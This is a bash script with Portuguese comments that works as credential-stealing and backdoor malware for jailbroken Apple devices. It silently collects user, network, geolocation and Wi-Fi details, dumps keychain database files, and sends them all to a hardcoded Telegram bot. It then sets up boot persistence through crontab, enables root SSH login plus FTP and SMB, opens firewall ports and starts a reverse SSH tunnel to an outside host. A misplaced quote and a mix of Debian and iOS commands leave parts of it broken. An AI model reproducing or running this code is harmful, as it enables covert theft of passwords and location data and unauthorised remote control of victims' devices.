#!/bin/bash

# Silenciar saída
exec > /dev/null 2>&1

# Instalar jq (caso não esteja instalado)
if ! command -v jq &> /dev/null; then
    apt-get update && apt-get install -y jq
fi

# Telegram API
TELEGRAM_BOT="7642318006:AAHQPYrQyWX0YRf7t9NuMtSpue6ilXVBtlU"
CHAT_ID="623114090"

# Função para enviar dados via Telegram
send_telegram() {
  curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT/sendMessage" \
  -d chat_id=$CHAT_ID -d text="$1"
}

# Capturar informações do sistema
IP_LOCAL=$(ip a | grep "inet " | grep -v "127.0.0.1" | awk '{print $2}' | cut -d/ -f1)
IP_PUBLICO=$(curl -s ifconfig.me)
HOSTNAME=$(hostname)
IOS_VERSION=$(sw_vers -productVersion 2>/dev/null || echo "Não disponível")
MODELO=$(sysctl -n hw.machine)
USUARIO_ATUAL=$(whoami)
USUARIOS=$(dscl . list /Users | grep -v '_' | tr '\n' ', ')
WIFI_INFO=$(networksetup -getairportnetwork en0 2>/dev/null)

# Capturar serviços ativos
SERVICOS=$(ps aux | grep -E "sshd|vsftpd|smbd" | awk '{print $11}' | uniq)

# Extrair pswds
if [ -d "/Library/MobileSubstrate" ]; then
  SENHAS=$(find /var/Keychains -name "*.db*" -exec cat {} \; 2>/dev/null)
else
  SENHAS="Acesso negado (Jailbreak necessário)"
fi

# Geolocalização com o IP público
GEO_INFO=$(curl -s "https://ipinfo.io/$IP_PUBLICO/geo")

# Extraindo dados de geolocalização
PAIS=$(echo $GEO_INFO | jq -r '.country')     # País
REGIAO=$(echo $GEO_INFO | jq -r '.region')     # Região/Estado
CIDADE=$(echo $GEO_INFO | jq -r '.city')       # Cidade
LATITUDE_LONGITUDE=$(echo $GEO_INFO | jq -r '.loc') # Latitude e Longitude

# Se não houver geolocalização disponível
if [ "$PAIS" == "null" ]; then
    PAIS="Não disponível"
    REGIAO="Não disponível"
    CIDADE="Não disponível"
    LATITUDE_LONGITUDE="Não disponível"
fi

# Relatório de informações
MSG="📲 *Relatorio Capturado*
👤 Usuário Atual: $USUARIO_ATUAL
🏷️ Hostname: $HOSTNAME
📱 Modelo: $MODELO
📟 iOS: $IOS_VERSION
🌐 IP Interno: $IP_LOCAL
🌍 IP Público: $IP_PUBLICO
🌏 País: $PAIS
🏙️ Cidade: $CIDADE
🌍 Região: $REGIAO
🌍 Localização (Lat, Long): $LATITUDE_LONGITUDE
📶 Wi-Fi: $WIFI_INFO
👥 Usuários do Sistema: $USUARIOS
🔑 Senhas Capturadas: $SENHAS"
⚙️ Serviços Ativos: $SERVICOS

# Enviar dados para Telegram
send_telegram "$MSG"

# Criar persistência no boot (Jailbreak necessário)
if [ -d "/Library/MobileSubstrate" ]; then
  echo "@reboot /var/root/stealthmodbot.sh &> /dev/null &" | crontab -
fi

# Configurar SSH, FTP e SMB para acesso remoto
for pkg in openssh-server vsftpd samba; do
  if ! dpkg -l | grep -q $pkg; then
    apt-get install -y $pkg
  fi
done

# Configurar SSH
launchctl load -w /Library/LaunchDaemons/com.openssh.sshd.plist || true
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
service ssh restart

# Configurar FTP
echo -e "listen=YES\nanonymous_enable=NO\nlocal_enable=YES\nwrite_enable=YES" > /etc/vsftpd.conf
service vsftpd restart

# Configurar SMB (Samba)
service smbd restart

# Abrir portas no firewall
iptables -A INPUT -p tcp --dport 22 -j ACCEPT  # SSH
iptables -A INPUT -p tcp --dport 21 -j ACCEPT  # FTP
iptables -A INPUT -p tcp --dport 445 -j ACCEPT  # SMB

# Criar túnel reverso para conexão externa
nohup ssh -R 2222:localhost:22 dinho@192.168.3.10 -N &> /dev/null &

# Executar serviços ocultos
nohup /usr/sbin/sshd &> /dev/null &
nohup /usr/sbin/smbd &> /dev/null &
nohup /usr/sbin/vsftpd &> /dev/null &
